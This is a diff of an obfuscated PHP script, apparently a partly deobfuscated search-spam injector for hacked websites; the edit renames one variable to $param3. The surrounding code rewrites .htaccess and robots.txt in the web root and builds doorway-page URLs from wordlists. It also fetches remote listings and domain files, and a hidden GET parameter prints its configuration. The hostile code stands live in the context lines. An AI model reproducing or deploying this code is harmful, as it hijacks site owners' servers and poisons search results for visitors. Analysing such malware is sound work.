@@ -154,7 +154,7 @@ exit();
 
 $param1 = "";
 $param2 = 0;
-$l1GRfrF8 = "";
+$param3 = "";
 $l1imRR = $l11ufJ = 0;
 $l1fCx83H = "";
 $l1VtbCwB = "";
@@ -761,7 +761,7 @@ function l1P9LVD($l15tGX=''){
     write_htaccess();
 
     // Config variables
-    global $param1,$param2,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h;
+    global $param1,$param2,$param3,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h;
     global $l135vXS,$l1bhL8Zi,$l1NhADdH,$l1h1,$l1gfDiJL,$l1T2,$l1imRR,$l1GH0rfZ,$l1bS3es,$l1M,$l1o7fR,$l1I,$l1Ni6,$l1Z4k;
 
     write_robots_txt($_SERVER["DOCUMENT_ROOT"]);
@@ -813,14 +813,14 @@ function l1P9LVD($l15tGX=''){
                     );
 
 
-    list($param1,$param2,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h) = $config_params;
+    list($param1,$param2,$param3,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h) = $config_params;
 
     print_r($config_params);
 
 
     $param1 = trim($param1);
     $param2 = trim($param2);
-    $l1imRR = preg_match("/\?/",$l1GRfrF8);
+    $l1imRR = preg_match("/\?/",$param3);
     $l1NhADdH = explode(',',$l1VtbCwB);
     $l1cdE = $l1h;
     $l1h = explode('||',$l1h);
@@ -871,14 +871,14 @@ function l1P9LVD($l15tGX=''){
     }
 
     $l1GpDpli = !is_old(__FILE__);
-    $l1Z4k=preg_match('/!$/',$l1GRfrF8)?1:0;
-    $l1GRfrF8=preg_replace('/!/','',$l1GRfrF8);
-    $l1GRfrF8=$l1GRfrF8=='?'?"$l1o7fR?":($l1GRfrF8=='/'?"$l1o7fR/":$l1GRfrF8);
-    $l1jBj79X=explode('|',"index.php|default.php|index.html|index.htm");
-    $l1jBj79X[]=$l1o7fR;
-    $l1uH=false;
-    $l1RB6TU=$l1xj0grt."|ls1|ls2";
-    $l1RB6TU=explode('|',$l1RB6TU);
+    $l1Z4k = preg_match('/!$/',$param3) ? 1 : 0;
+    $param3 = preg_replace('/!/','',$param3);
+    $param3 = $param3 == '?' ? "$l1o7fR?": ($param3=='/'?"$l1o7fR/" : $param3);
+    $l1jBj79X = explode('|',"index.php|default.php|index.html|index.htm");
+    $l1jBj79X[] = $l1o7fR;
+    $l1uH = false;
+    $l1RB6TU = $l1xj0grt."|ls1|ls2";
+    $l1RB6TU = explode('|',$l1RB6TU);
 
     foreach($l1RB6TU as$l14eeRaA){
         $l1c9 = preg_replace("/(\?|&)".$l14eeRaA."/si",'',$l1c9);
@@ -895,7 +895,7 @@ function l1P9LVD($l15tGX=''){
         exit();
     }
 
-    $l1iQ=$l1GRfrF8;
+    $l1iQ = $param3;
     $l1iQ=preg_replace("/^\//si",'',$l1iQ);
     $l1Q8lar=l1Rc6HvA($l1c9);
     $l1FP8t=false;
@@ -1043,7 +1043,7 @@ function l1P9LVD($l15tGX=''){
     $l1xUB=substr($l1VQ,0,strrpos($l1VQ,'/'))."/domain.txt";
     $l1DLH=$l1VQ."?listing=%s";
     $l1TE9=substr(md5($l1xUB),0,6);
-    $l1GH0rfZ=array("extensions"=>$l1T2,"url_rules"=>$l1gfDiJL,"wordlist_array"=>$l1NhADdH,"url_prefix"=>$l1GRfrF8,"url_prefix_qm"=>$l1imRR,);
+    $l1GH0rfZ=array("extensions"=>$l1T2,"url_rules"=>$l1gfDiJL,"wordlist_array"=>$l1NhADdH,"url_prefix"=>$param3,"url_prefix_qm"=>$l1imRR,);
 
     if($l1VC2k){
         $l1US = array();
@@ -1329,7 +1329,7 @@ function l1P9LVD($l15tGX=''){
     echo download($l1V65T);
     exit();
     }}if(isset($_GET[$l1EkZsk])){
-    echo sprintf("domain=%s<br />lineNo=%s<br />url_prefix=%s<br />charlist=%s<br />wordlist=%s<br />google_veri=%s<br/>http_get=%s<br/>cache=%s<br/>pgmb=%s<br/>urlgz=%s",$l13dbLD,$l19,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,implode('',$l11ufJ),$l1c,$l1cdE);
+    echo sprintf("domain=%s<br />lineNo=%s<br />url_prefix=%s<br />charlist=%s<br />wordlist=%s<br />google_veri=%s<br/>http_get=%s<br/>cache=%s<br/>pgmb=%s<br/>urlgz=%s",$l13dbLD,$l19,$param3,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,implode('',$l11ufJ),$l1c,$l1cdE);
     exit();
     }
     if($l1WyZOKd){
@@ -1366,7 +1366,7 @@ function l1P9LVD($l15tGX=''){
         }
     }
 
-    $l1Kr = str_replace("[##zhang##]","$l1Z4k$l1GRfrF8",$l1Kr);
+    $l1Kr = str_replace("[##zhang##]","$l1Z4k$param3",$l1Kr);
     $l1Vvtr = trim($l1Vvtr);
 
     if($l1Vvtr!=''){
